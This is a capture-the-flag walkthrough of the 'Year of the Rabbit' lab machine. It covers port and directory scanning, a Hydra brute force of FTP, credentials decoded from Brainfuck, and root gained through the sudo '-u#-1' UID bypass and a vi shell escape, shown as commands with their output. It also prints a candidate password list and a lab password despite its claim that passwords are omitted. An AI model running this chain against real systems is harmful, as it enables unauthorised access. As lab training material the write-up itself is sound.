## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Time to enter the warren...
Let's have a nice gentle start to the New Year!  
Can you hack into the Year of the Rabbit box without falling down a hole?

**_(Please ensure your volume is turned up!)_**
```
## IP-Address
```IP
10.48.186.183
```
## Enumeration 
#### Network Scan 
```bash
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.2
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAILCKdtvyy1FqH1gBS+POXpHMlDynp+m6Ewj2yoK2PJKJeQeO2yRty1/qcf0eAHJGRngc9+bRPYe4M518+7yBVdO2p8UbIItiGzQHEXJu0tGdhIxmpbTdCT6V8HqIDjzrq2OB/PmsjoApVHv9N5q1Mb2i9J9wcnzlorK03gJ9vpxAAAAFQDVV1vsKCWHW/gHLSdO40jzZKVoyQAAAIA9EgFqJeRxwuCjzhyeASUEe+Wz9PwQ4lJI6g1z/1XNnCKQ9O6SkL54oTkB30RbFXBT54s3a11e5ahKxtDp6u9yHfItFOYhBt424m14ks/MXkDYOR7y07FbBYP5WJWk0UiKdskRej9P79bUGrXIcHQj3c3HnwDfKDnflN56Fk9rIwAAAIBlt2RBJWg3ZUqbRSsdaW61ArR4YU7FVLDgU0pHAIF6eq2R6CCRDjtbHE4X5eW+jhi6XMLbRjik9XOK78r2qyQwvHADW1hSWF6FgfF2PF5JKnvPG3qF2aZ2iOj9BVmsS5MnwdSNBytRydx9QJiyaI4+HyOkwomj0SINqR9CxYLfRA==
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZyTWF65dczfLiKN0cNpHhm/nZ7FWafVaCf+Oxu7+9VM4GBO/8eWI5CedcIDkhU3Li/XBDUSELLXSRJOtQj5WdBOrFVBWWA3b3ICQqk0N1cmldVJRLoP1shBm/U5Xgs5QFx/0nvtXSGFwBGpfVKsiI/YBGrDkgJNAYdgWOzcQqol/nnam8EpPx0nZ6+c2ckqRCizDuqHXkNN/HVjpH0GhiscE6S6ULvq2bbf7ULjvWbrSAMEo6ENsy3RMEcQX+Ixxr0TQjKdjW+QdLay0sR7oIiATh5AL5vBGHTk2uR8ypsz1y7cTyXG2BjIVpNWeTzcip7a2/HYNNSJ1Y5QmAXoKd
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKavguvzBa889jvV30DH4fhXzMcLv6VdHFx3FVcAE0MqHRcLIyZcLcg6Rf0TNOhMQuu7Cut4Bf6SQseNVNJKK8=
|   256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBJPbfvzsYSbGxT7dwo158eVWRlfvXCxeOB4ypi9Hgh
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Apache2 Debian Default Page: It works
```
#### Browser 
- Port 80
- `Apache` Default page 
- Directory enumeration
```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 278]
.hta                 (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
assets               (Status: 301) [Size: 315] [--> http://10.48.186.183/assets/]
index.html           (Status: 200) [Size: 7853]
server-status        (Status: 403) [Size: 278]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```
- Navigate To `assets`
```bash
Index of /assets
￼	Name	Last modified	Size	Description
￼	Parent Directory	 	-	 
￼	RickRolled.mp4	2020-01-23 00:34	384M	 
￼	style.css	2020-01-23 00:34	2.9K	 
Apache/2.4.10 (Debian) Server at 10.48.186.183 Port 80
```
- Inside `Style.css` Got Something
```bash
 body, html {
    padding: 3px 3px 3px 3px;
    background-color: #D8DBE2;
    font-family: Verdana, sans-serif;
    font-size: 11pt;
    text-align: center;
  }
  /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
  div.main_page {
    position: relative;
    display: table;
    width: 800px;
```
- Navigate to `http://10.48.186.183/sup3r_s3cr3t_fl4g.php` which is showing turn of java-script
```bash
$ wget  http://10.48.186.183/sup3r_s3cr3t_fl4g.php
sup3r_s3cr3t_fl4g.ph 100%[=====================>]     611  --.-KB/s   
$ ls
Desktop    Downloads  Pictures  sup3r_s3cr3t_fl4g.php  venv    VPN
Documents  Music      Public    Templates              Videos

$ cat sup3r_s3cr3t_fl4g.php
<html>
	<head>
		<title>sup3r_s3cr3t_fl4g</title>
	</head>
	<body>
		<noscript>Love it when people block Javascript...<br></noscript>
		<noscript>This is happening whether you like it or not... The hint is in the video. If you're stuck here then you're just going to have to bite the bullet!<br>Make sure your audio is turned up!<br></noscript>
		<script>
			alert("Word of advice... Turn off your javascript...");
			window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1";
		</script>
		<video controls>
			<source src="/assets/RickRolled.mp4" type="video/mp4">
		</video>
	</body>
</html>
```
- Got Nothing here...
- But while watching video at 0:56 second there is a hint where it called `burp`
- SO, Let's use Burpsuite
```Req
GET /sup3r_s3cr3t_fl4g.php HTTP/1.1
Host: 10.49.175.143
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate
Connection: close
```
- Its an `PHP` Req. and its response is
```Response
GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
Host: 10.49.175.143
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate
Connection: close
```
- Got the Hidden Directory name `/WExYY2Cv-qU`  & with another `php` Function `intermediary.php` & `hidden_directory` parameter
- Navigate to `http://10.49.175.143/WExYY2Cv-qU/`
- Got an `PNG` File 
- Let's Download it 
```bash
$ wget http://10.49.175.143/WExYY2Cv-qU/Hot_Babe.png
$ strings Hot_Babe.png
Eh, you''ve earned this. Username for FTP is ftpuser
One of these is the password:
[password omitted]
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&=0Z
nR8&FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
5iez1wGXKfPKQ
nJ90XzX&AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&bNl3#&l
zLH%Ot0Bw&c%9
```
- Got a Password List 
#### Port 21
- FTP Enumeration
- Let's Use Hydra
```bash
─$ hydra -l ftpuser -P list.txt ftp://10.49.175.143 -t 16 -f
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-11 19:37:00
[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[DATA] attacking ftp://10.49.175.143:21/
[21][ftp] host: 10.49.175.143   login: ftpuser   password: [password omitted]
[STATUS] attack finished for 10.49.175.143 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-11 19:37:13
```
- Got the Credentials
```Creds
Username - ftpuser
password - [password omitted]
```
- Login
```bash
$ ftp $TARGET
Connected to 10.49.175.143.
220 (vsFTPd 3.0.2)
Name (10.49.175.143:kali): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||40103|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
226 Directory send OK.
ftp> get Eli's_Creds.txt
local: Eli's_Creds.txt remote: Eli's_Creds.txt
229 Entering Extended Passive Mode (|||45741|).
150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).
100% |**************************************|   758      679.11 KiB/s    00:00 ETA
226 Transfer complete.
758 bytes received in 00:00 (9.25 KiB/s)
```
- Got `Eli's_Creds.txt` 
- Lets Check what's inside 
```bash
$ cat Eli\'s_Creds.txt
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```
- This is Actually `BrainFuck` Cipher 
- which means
```bash
User: eli
Password: [password omitted]
```
- Got SSH Credentials
#### SSH
```bash
$ ssh eli@$TARGET
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
eli@10.49.175.143's password:
1 new message
Message from Root to Gwendoline:
"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"
END MESSAGE
eli@year-of-the-rabbit:~$ whoami
eli
eli@year-of-the-rabbit:~$ id
uid=1000(eli) gid=1000(eli) groups=1000(eli),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),119(bluetooth)
```
- Got Message Which is by `root` to `Gwendoline`
- but it gives us hint about a `s3cr3t`  Folder inside the machine 
```bash
eli@year-of-the-rabbit:~$ find / -type d -iname "*secret*" 2>/dev/null
/usr/share/doc/libsecret-common
/usr/share/doc/libsecret-1-0
/usr/share/doc/gir1.2-secret-1
eli@year-of-the-rabbit:~$ find / -type d -iname "*s3cr3t*" 2>/dev/null
/usr/games/s3cr3t
eli@year-of-the-rabbit:~$ cat /usr/games/s3cr3t/
cat: /usr/games/s3cr3t/: Is a directory
eli@year-of-the-rabbit:~$ cd /usr/games/s3cr3t/
eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Jan 23  2020 .
drwxr-xr-x 3 root root 4096 Jan 23  2020 ..
-rw-r--r-- 1 root root  138 Jan 23  2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
</s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\!
Your password is awful, Gwendoline.
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!
Yours sincerely
   -Root
```
- Got the `Credentials` for `Gwendoline`
```creds
username - Gwendoline
Password - [password omitted]
```
- Almost Forget about the case Sensitivity of Linux
```bash
$ ssh gwendoline@$TARGET
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
gwendoline@10.49.175.143's password:
[password omitted]
1 new message
Message from Root to Gwendoline:
"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"
END MESSAGE
gwendoline@year-of-the-rabbit:~$
```
- Same Message as before
#### Privilege Escalation
```bash
gwendoline@year-of-the-rabbit:~$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
gwendoline@year-of-the-rabbit:~$
```
- Except Root vi can be run by Any-User
```theory 
Why That Exploit Worked
You had this rule:
(ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt

👉 Meaning:
- You can run `vi` as **any user**
- BUT **not as root**

🚨 The Assumption (and flaw)
The system assumes:
 “If we block `root`, the user can’t become root”
👉 That assumption is wrong.

🔥 The Trick You Used
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
What is `-u#-1`?
- `-u#` → specify **UID directly**
- `-1` → negative UID
```
- Exploit - 
```bash
$ sudo -u ftpuser /usr/bin/vi /home/gwendoline/user.txt
// Got access as FTPuser 

$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
//Got access as root
```
- Got the Root Access
```bash
:!/bin/bash
root@year-of-the-rabbit:/home/gwendoline# whoami
root
root@year-of-the-rabbit:/home/gwendoline# cat /home/gwendoline/user.txt
[flag omitted]
root@year-of-the-rabbit:/home/gwendoline# cat /root/root.txt
[flag omitted]
root@year-of-the-rabbit:/home/gwendoline#
```
## Flags
```Flags
User - [flag omitted]
Root - [flag omitted]
```
# END